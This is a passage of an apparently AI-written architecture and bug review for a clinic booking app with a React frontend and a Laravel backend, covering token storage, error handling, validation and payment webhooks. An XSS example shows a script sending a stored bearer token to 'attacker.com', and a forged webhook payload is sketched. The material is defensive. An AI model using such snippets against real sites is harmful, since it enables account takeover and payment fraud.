- Lost revenue from missed appointments

---

## ⚠️ Frontend Pain Points (5)

### 1. **Token in LocalStorage (XSS Vulnerability)**

**Problem:**
```javascript
// src/api/axios.js

export const getToken = () => localStorage.getItem(STORAGE_KEY_TOKEN);
export const setToken = (t) => localStorage.setItem(STORAGE_KEY_TOKEN, t);

// Token stored in plain localStorage, accessible to JavaScript
```

**Why It Hurts:**
- ❌ Any JavaScript can access token (XSS attack)
- ❌ Third-party script injection → token stolen
- ❌ Malicious npm package → token leaked
- ❌ Browser extension with XSS → token compromised
- ❌ Token in Network tab when developer tools open

**Attack Scenario:**
```javascript
// Attacker injects script
<script>
fetch('http://attacker.com/steal?token=' + localStorage.getItem('aura_token'));
</script>

// Token sent to attacker's server
// Attacker now has bearer token = full access
```

**Why localStorage is Bad:**
```
localStorage      | Vulnerable to XSS? | Vulnerable to CSRF?
─────────────────┼───────────────────┼──────────────────
localStorage      | ✅ YES             | ❌ No
sessionStorage    | ✅ YES             | ❌ No
HttpOnly Cookie   | ❌ NO              | ✅ YES (CSRF token needed)
Memory variable   | ❌ NO              | ❌ NO (lost on refresh)

BEST PRACTICE: HttpOnly Cookie + CSRF Token
CURRENT STATE: localStorage (vulnerable)
```

**Cost:**
- Account takeovers
- Patient data access
- Medical records exposed
- Payment method theft

**Solution:**
```javascript
// Use HttpOnly cookie instead
// Backend: Set-Cookie: aura_token=...; HttpOnly; Secure; SameSite=Strict
// Frontend: No localStorage needed
// Axios automatically includes cookies in requests
```

---

### 2. **No Error Boundary (App Crashes on Unhandled Errors)**

**Problem:**
```javascript
// BookingPage.jsx

// If any component throws error, entire app crashes
// No error boundary to catch

export default function BookingPage() {
  // If doctorApi.getAvailableDoctors throws
  // Or if DoctorSelect component has bug
  // Entire page white-screens
}

// No try-catch at page level
```

**Why It Hurts:**
- ❌ One component error = entire app crashes
- ❌ User loses booking form progress
- ❌ White screen with no feedback
- ❌ User doesn't know what happened
- ❌ Have to reload page (lost form data)
- ❌ Poor user experience

**Example Crash:**
```javascript
const [doctors, setDoctors] = useState(null);

// API returns error, doctors remains null
const doctorOptions = doctors.map(d => d.name); // CRASH!
// TypeError: Cannot read property 'map' of null

// Entire page crashes
// User sees white screen
```

**Cost:**
- Lost bookings (users abandon mid-form)
- Support tickets: "App broken"
- Bounce rate increases
- Revenue loss from incomplete transactions

**Solution:**
```javascript
// Add Error Boundary component
class ErrorBoundary extends React.Component {
  componentDidCatch(error, errorInfo) {
    // Log error
    // Show fallback UI
  }
  
  render() {
    if (this.state.hasError) {
      return <div>Oops, something went wrong. Try refreshing.</div>;
    }
    return this.props.children;
  }
}

// Wrap pages
<ErrorBoundary>
  <BookingPage />
</ErrorBoundary>
```

---

### 3. **Manual Data Synchronization Between Contexts**

**Problem:**
```javascript
// Multiple contexts manage overlapping data

AuthContext:
├─ user (has booking history?)
└─ token

BookingContext:
├─ bookings (list of patient's bookings)
├─ activeBooking (current booking)
└─ error

// When user updates, bookings are not updated
// When booking is deleted, UI might show stale data
// No automatic sync

// Example: Delete booking
bookingApi.deleteBooking(1)
  .then(() => {
    // Must manually call:
    bookingContext.fetchBookings(); // ← Manual refresh needed
    
    // If developer forgets, UI shows deleted booking
  });
```

**Why It Hurts:**
- ❌ Easy to forget manual refresh
- ❌ Stale data in UI
- ❌ User sees "deleted" item still in list
- ❌ Confusing UX
- ❌ Multiple sources of truth

**Real Scenario:**
```javascript
// PatientDashboard
const [upcomingBookings, setUpcomingBookings] = useState([]);

// Fetch upcomingBookings
useEffect(() => {
  bookingApi.getBookings().then(setUpcomingBookings);
}, []);

// User navigates to MyBookings, cancels one
// Returns to Dashboard

// Dashboard still shows canceled booking
// (useEffect didn't re-run)
```

**Cost:**
- Confused users
- Support: "Why is my canceled booking still showing?"
- Workaround: Manual page refresh
- Poor perceived reliability

**Solution:**
```javascript
// Use React Query or SWR for automatic cache invalidation

const { data: bookings } = useQuery(
  'bookings',
  () => bookingApi.getBookings()
);

// When mutation completes, automatically refetch
const { mutate: deleteBooking } = useMutation(
  bookingApi.deleteBooking,
  {
    onSuccess: () => {
      queryClient.invalidateQueries('bookings'); // Auto-refetch
    }
  }
);
```

---

### 4. **No Form Validation Before Submit (Server-Only Validation)**

**Problem:**
```javascript
// BookingPage.jsx

const handleSubmit = async () => {
  // No client-side validation!
  
  // Sends to server immediately
  await bookingApi.createBooking({
    service_id,
    doctor_id,
    booked_date,
    booked_time
  });
  
  // Server returns 422 with field errors
  // Then shows errors to user
};

// Issue: User submits bad data → Server rejects → Error shown
// Better: Validate before submit
```

**Why It Hurts:**
- ❌ Network round-trip for validation
- ❌ Slower feedback (user must wait for response)
- ❌ Bad UX (errors shown AFTER submit)
- ❌ Wasted server resources
- ❌ More backend load

**Example:**
```javascript
// User forgets to select doctor
// Clicks "Confirm"
// 2 second wait...
// Server responds: "doctor_id is required"
// User goes back and selects doctor
// Clicks again...

// Better: Show "Please select doctor" immediately
```

**Current State:**
```
Form Submit → Network Delay (1-2s) → Server Validation → Error Response → Show Error

DESIRED STATE:
Form Submit → Client Validation (instant) → If valid: Network → Server Validation → Success
            └→ If invalid: Show Error (instant, no network)
```

**Cost:**
- Poor perceived performance
- User frustration
- More server load

**Solution:**
```javascript
// Add client-side validation
const [errors, setErrors] = useState({});

const validate = () => {
  const newErrors = {};
  if (!formData.service_id) newErrors.service_id = 'Required';
  if (!formData.doctor_id) newErrors.doctor_id = 'Required';
  if (!formData.booked_date) newErrors.booked_date = 'Required';
  setErrors(newErrors);
  return Object.keys(newErrors).length === 0;
};

const handleSubmit = async () => {
  if (!validate()) return; // Stop if invalid
  
  // Now submit to server
  await bookingApi.createBooking(formData);
};
```

---

### 5. **Loading States Not Consistently Managed**

**Problem:**
```javascript
// BookingPage.jsx

const handleSubmit = async () => {
  // No loading state!
  
  const response = await bookingApi.createBooking(formData);
  
  // User clicks submit
  // Button still appears clickable
  // Can click multiple times
  // Creates multiple bookings!
};

// Better: Show loading, disable button
```

**Why It Hurts:**
- ❌ User can double-submit form
- ❌ Creates duplicate bookings
- ❌ No visual feedback while waiting
- ❌ Appears broken/slow
- ❌ Inconsistent across pages

**Double-Submit Scenario:**
```
1. User clicks "Confirm Booking"
2. No visual change (no loading indicator)
3. User thinks button didn't work
4. Clicks again (and again)
5. Server receives 3 requests
6. Creates 3 duplicate bookings!

Support gets call: "Why do I have 3 bookings for same time?"
```

**Different Patterns Across App:**
```javascript
// BookingPage: No loading state
// AdminDoctors: Shows loading spinner
// MyBookings: No loading state
// AdminServices: Shows loading spinner

→ Inconsistent UX across app
```

**Cost:**
- Duplicate bookings (support workload)
- Multiple payments charged
- Refund requests
- User frustration

**Solution:**
```javascript
const [loading, setLoading] = useState(false);

const handleSubmit = async () => {
  if (loading) return; // Prevent double-submit
  
  setLoading(true);
  try {
    await bookingApi.createBooking(formData);
    // Success
  } finally {
    setLoading(false);
  }
};

// Render
<button disabled={loading}>
  {loading ? 'Processing...' : 'Confirm Booking'}
</button>
```

---

## 🐛 Backend Bugs & Issues (5)

### Bug #1: Token Refresh Endpoint Returns Plain Token (No JSON Wrapper)

**File:** `BE/app/Http/Controllers/Auth/AuthController.php`
**Issue:** Inconsistent response format

**Problem:**
```php
public function refresh(Request $request)
{
    $user = Auth::user();
    $token = $user->createToken('auth_token')->plainTextToken;
    
    // Returns plain text, not JSON!
    return response()->json([
        'token' => $token,  // Should wrap in 'data'
        'user' => $user
    ]);
    
    // But other endpoints use ApiResponseTrait:
    // return $this->successResponse($booking, 'Created');
    // Which wraps in { success, data, message }
}

// Frontend expects:
response.data.data.token // Double nesting from ApiResponseTrait
// But this endpoint returns:
response.data.token // Different structure!
```

**Impact:**
- Frontend axios interceptor breaks
- Token refresh fails
- Automatic token rotation doesn't work
- User gets logged out mid-session

**Fix:**
```php
return $this->successResponse(
    ['token' => $token, 'user' => $user],
    'Token refreshed'
);
```

---

### Bug #2: DoctorService Requires UserRepository But Original Provider Binding Missing

**File:** `BE/app/Providers/AppServiceProvider.php` (ALREADY FIXED IN PREVIOUS SESSION)
**Issue:** Missing dependency parameter

**Problem:**
```php
// Original binding (WRONG):
$this->app->singleton(
    DoctorService::class,
    fn($app) =>
    new DoctorService(
        $app->make(DoctorRepository::class),
        // Missing: UserRepository::class
    )
);

// But DoctorService::__construct() expects:
public function __construct(
    protected DoctorRepository $doctorRepository,
    protected UserRepository   $userRepository,  // ← Missing!
) {
    parent::__construct($doctorRepository);
}
```

**Impact:**
- ✅ ALREADY FIXED (from earlier session)
- Runtime error: Missing argument 2

---

### Bug #3: Schedule Conflict Validation Doesn't Prevent Overlapping Times

**File:** `BE/app/Services/ScheduleService.php`
**Issue:** Logic error in overlap detection

**Problem:**
```php
public function validateNoConflict($doctorId, $dayOfWeek, $startTime, $endTime, $excludeScheduleId = null)
{
    $query = DoctorSchedule::query()
        ->where('doctor_id', $doctorId)
        ->where('day_of_week', $dayOfWeek);
    
    if ($excludeScheduleId) {
        $query->where('schedule_id', '!=', $excludeScheduleId);
    }
    
    $conflicts = $query->get();
    
    foreach ($conflicts as $schedule) {
        // Check overlap: Does new schedule overlap with existing?
        if (
            // NEW overlaps with EXISTING?
            $startTime < $schedule->end_time &&   // Start before existing ends
            $endTime > $schedule->start_time       // End after existing starts
        ) {
            throw ValidationException::withMessages([...]);
        }
    }
}

// ISSUE: Using string comparison!
// "09:00" < "12:00" works, but:
// "9:00" < "12:00" also works
// "09:30" < "09:15" FAILS (string comparison)

// Example:
$startTime = "09:00";        // 9 AM
$existingEnd = "10:00";      // 10 AM

// Is 09:00 < 10:00 in string comparison?
// YES, but barely (lexicographic comparison)
// "09" > "10" (string) but OK for times format HHMM

// Better: Use strtotime() or Carbon for time comparison
```

**Real Scenario:**
```
Doctor has: 09:00-10:00
Admin tries to add: 09:30-11:00
Should conflict? YES

Current check:
├─ 09:30 < 10:00? YES ✓
├─ 11:00 > 09:00? YES ✓
└─ Prevents double-booking ✓

Actually works fine because time format is HHMM
But fragile if times change format
```

**Better Implementation:**
```php
// Use Carbon for safety
$startTime = Carbon::parse($startTime);
$existingStart = Carbon::parse($schedule->start_time);
$existingEnd = Carbon::parse($schedule->end_time);
$endTime = Carbon::parse($endTime);

if ($startTime < $existingEnd && $endTime > $existingStart) {
    // Conflict
}
```

---

### Bug #4: Medical Record Prescription Relationship Not Loaded in API Response

**File:** `BE/app/Http/Controllers/Medical/MedicalController.php`
**Issue:** Missing eager loading

**Problem:**
```php
public function show($id)
{
    $record = $this->medicalService->getMedicalRecordById($id);
    
    // MedicalRecord retrieved WITHOUT prescriptions loaded
    // If template shows prescriptions:
    // $record->prescriptions ← Returns null or empty collection
    
    // Frontend expects:
    {
      "record_id": 1,
      "diagnosis": "...",
      "prescriptions": [  // ← Empty or missing
        { "prescription_id": 1, "description": "..." }
      ]
    }
}

// Fix: Eager load prescriptions
public function show($id)
{
    $record = MedicalRecord::with('prescriptions')
        ->findOrFail($id);
    return $this->successResponse($record);
}
```

**Impact:**
- Frontend gets empty prescriptions
- Prescriptions not displayed
- Doctor has to click separate endpoint to see medications
- Bad UX

---

### Bug #5: Midtrans Webhook Signature Verification Disabled

**File:** `BE/app/Services/PaymentService.php`
**Issue:** Security vulnerability (webhook not validated)

**Problem:**
```php
public function handleWebhook(array $payload)
{
    // NO SIGNATURE VERIFICATION!
    
    // Attacker could send fake webhook:
    POST /payments/webhook
    {
      "order_id": "123",
      "transaction_status": "settlement",
      "transaction_id": "fake-midtrans-id"
    }
    
    // Backend accepts it!
    // Creates fake payment record
    // Order marked as "paid" without actual payment
    
    // Current code:
    $order = $this->orderRepository->findByOrderNumber($payload['order_id']);
    if (!$order) return;
    
    $payment = $this->paymentRepository->findByOrderId($order->order_id);
    
    // Update status WITHOUT verifying signature
    $payment->update([
        'status' => $payload['transaction_status'],
        'midtrans_id' => $payload['transaction_id']
    ]);
    
    // Order marked as PAID (fake)
}

// Should verify:
// 1. Signature key (from Midtrans)
// 2. Order ID matches
// 3. Amount matches
```

**Correct Implementation:**
```php
public function handleWebhook(array $payload)
{
    // Verify signature
    $signature = $payload['signature_key']; // From Midtrans
    
    $serverKey = config('midtrans.server_key');
    $orderId = $payload['order_id'];
    $statusCode = $payload['status_code'];
    $grossAmount = $payload['gross_amount'];
    
    $verifyKey = hash(
        'sha512',
        "$orderId$statusCode$grossAmount$serverKey"
    );
    
    if ($signature !== $verifyKey) {
        throw new Exception('Invalid webhook signature');
    }
    
    // Now safe to process
    // ...
}
```

**Impact:**
- 🚨 CRITICAL: Fake payments can be created
- Free bookings for fraudsters
- Revenue loss
- Compliance issue

---

## 🐛 Frontend Bugs & Issues (5)

### Bug #1: PaymentResultPage Doesn't Handle Page Refresh

**File:** `FE/src/pages/PaymentResultPage.jsx`
**Issue:** Session not recovered after reload

**Problem:**
```javascript
export default function PaymentResultPage() {
  const { user } = useContext(AuthContext);
  
  // On first load:
  const [status, setStatus] = useState(null);
  
  useEffect(() => {
    // Gets query params
    const params = new URLSearchParams(window.location.search);
    const orderId = params.get('order_id');
    
    // Tries to fetch payment status
    paymentApi.getPaymentByOrder(orderId)
      .then(data => setStatus(data.status))
      .catch(err => console.log(err));
  }, []);
  
  // PROBLEM: If user refreshes page
  // AuthContext loses user (not yet recovered from localStorage)
  // paymentApi call might fail (token not loaded yet)
  // Status shows "loading" forever
}

// OR: If browser closes after Midtrans redirect
// User returns next day
// Token in localStorage but invalid (maybe expired)
// Payment status call fails with 401
// User sees error, doesn't know if payment went through
```

**Impact:**
- User uncertainty: "Was my payment successful?"
- Cannot confirm booking status
- Support calls: "Did my payment go through?"
- Users abandon and rebook elsewhere

---

### Bug #2: BookingContext Doesn't Clear Error After Success

**File:** `FE/src/contexts/BookingContext.jsx`
**Issue:** Error state not reset

**Problem:**
```javascript
const createBooking = async (data) => {
  try {
    setError(null); // Good
    setLoading(true);
    
    const response = await bookingApi.createBooking(data);
    
    setBookings([...bookings, response.data]);
    // SUCCESS - but no error reset needed here
  } catch (error) {
    // Extract validation errors
    if (error.response?.status === 422) {
      setError(error.response.data.data); // Set error
    } else {
      setError({ general: error.response?.data?.message });
    }
  } finally {
    setLoading(false);
  }
};

// ISSUE: After first successful booking, create another
// Click submit again
// If error occurs this time, error from FIRST attempt might show
// Because error wasn't cleared before new attempt

// Better: Clear error at start
```

**Real Scenario:**
```
1. First booking: User forgets to select doctor
   → Error shown: "Doctor is required"
2. User selects doctor, submits again
3. Second booking: User forgets to select date
   → Both errors show: "Doctor required" + "Date required"
   → But doctor WAS selected!
   → Confusing
```

---

### Bug #3: Doctor Schedule Not Filtered by Service in Booking Form

**File:** `FE/src/pages/patient/BookingPage.jsx`
**Issue:** Logic missing in Step 2

**Problem:**
```javascript
// Step 1: Select Service
const [selectedService, setSelectedService] = useState(null);

// Step 2: Select Doctor (should filter by service)
const [doctors, setDoctors] = useState([]);

useEffect(() => {
  // WRONG: Gets ALL available doctors
  doctorApi.getAvailableDoctors()
    .then(setDoctors);
    
  // CORRECT: Should get doctors by service
  // doctorApi.getDoctorsByService(selectedService.service_id)
}, [selectedService]); // Missing: selectedService dependency

// Result:
// User selects "Hair Treatment"
// But sees doctors for "Facial" and "Massage" too
// Doctor "Dr. Ani" specializes in Spa, not Hair
// User books with wrong doctor
// On appointment day: Doctor doesn't offer that service!
```

**Impact:**
- Wrong doctor assigned
- Service mismatch
- Patient complaint: "I booked Hair treatment but doctor offers Spa"
- Support effort to fix
- Negative review

---

### Bug #4: Cart Context Not Synced with Order Creation

**File:** `FE/src/contexts/CartContext.jsx`
**Issue:** Cart items shown after checkout

**Problem:**
```javascript
const checkout = async () => {
  try {
    setLoading(true);
    
    const response = await orderApi.createOrder(items);
    
    // Create order successful
    // But cart not cleared!
    
    // Should clear cart after order
    setItems([]); // ← Missing
  } catch (error) {
    setError(error);
  } finally {
    setLoading(false);
  }
};

// Result:
// User adds 3 items to cart
// Clicks checkout
// Order created successfully
// User navigates back to cart
// Still shows 3 items!
// User thinks order didn't go through
// Clicks checkout again
// Creates duplicate order!
```

**Impact:**
- Duplicate orders
- Double payment charges
- Refund requests
- User frustration

---

### Bug #5: No Validation That Doctor Has Active Schedule on Selected Date

**File:** `FE/src/pages/patient/BookingPage.jsx`
**Issue:** Frontend doesn't check if selected date is actually available

**Problem:**
```javascript
// Step 3: Pick Date
const [availableDates, setAvailableDates] = useState([]);

useEffect(() => {
  // Fetch available dates (14-day range)
  scheduleApi.getTakenDates(selectedDoctor.doctor_id)
    .then(takenDates => {
      // Calculate available dates
      const available = calculateAvailableDates(takenDates);
      setAvailableDates(available);
    });
}, [selectedDoctor]);

const handleDateSelect = (date) => {
  // MISSING: Check if date is actually in availableDates
  // Just sets it
  setFormData({...prev, booked_date: date});
};

// Scenario:
// Schedule says: Doctor available Mon-Fri
// Calendar shows: Only Mon-Fri available
// But admin deletes Monday schedule AFTER calendar loads
// User clicks Monday (old cached data)
// Submits booking for Monday
// Server rejects: "No schedule on Monday"
// 422 error shown to user
// Confusing: "But calendar said Monday was available!"
```

**Better Implementation:**
```javascript
const handleDateSelect = (date) => {
  // Verify date is actually in availableDates
  if (!isDateAvailable(date, availableDates)) {
    setError("This date is no longer available");
    return;
  }
  
  setFormData({...prev, booked_date: date});
};
```

**Impact:**
- Unexpected errors
- User confusion
- Form submission fails
- Bad UX

---

## Summary Table

### Backend Issues
| Issue | Severity | Impact | Fix Time |
|-------|----------|--------|----------|
| Manual Service Binding | MEDIUM | 30min per new service | 2 hours |
| Event Listener Stubs | HIGH | No notifications | 4 hours |
| No Token Expiry | CRITICAL | Permanent access if token stolen | 3 hours |
| No Rate Limiting | HIGH | Brute force attacks possible | 2 hours |
| Slot Locking Edge Case | MEDIUM | Possible overbooking | 3 hours |

### Frontend Issues
| Issue | Severity | Impact | Fix Time |
|-------|----------|--------|----------|
| Token in localStorage | CRITICAL | XSS = token theft | 4 hours |
| No Error Boundary | HIGH | App crashes | 2 hours |
| Manual Data Sync | MEDIUM | Stale UI data | 3 hours |
| No Client Validation | MEDIUM | Slow UX | 2 hours |
| Inconsistent Loading States | MEDIUM | Double-submit bugs | 2 hours |

---

**Generated**: June 6, 2026  
**Status**: Architecture documented with identified issues
